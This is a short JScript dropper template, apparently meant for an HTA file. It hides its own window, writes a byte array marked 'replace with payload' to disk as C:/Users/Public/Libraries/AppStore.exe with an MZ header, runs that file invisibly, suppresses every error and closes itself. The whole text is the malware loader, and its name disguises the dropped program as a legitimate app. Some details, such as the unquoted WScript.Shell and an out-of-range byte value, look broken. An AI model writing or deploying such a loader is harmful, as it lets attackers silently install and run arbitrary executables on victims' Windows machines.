window.resizeTo(0, 0)
try {
  const data = [144, 3, 0, 4, 0, 65545, 0, 184] // replace with payload
  const path = 'C:/Users/Public/Libraries/AppStore.exe'
  let fso = new ActiveXObject('Scripting.FileSystemObject')

  const content = data
    .map((charCode) => String.fromCharCode(charCode))
    .join('')

  let file = fso.CreateTextFile(path, true)
  file.Write('MZ')
  file.Close()

  file = fso.OpenTextFile(path, 8, false, -1)
  file.Write(content)
  file.Close()

  let shell = new ActiveXObject(WScript.Shell)
  shell.Run(path, 0)
} catch (error) {}
window.close()
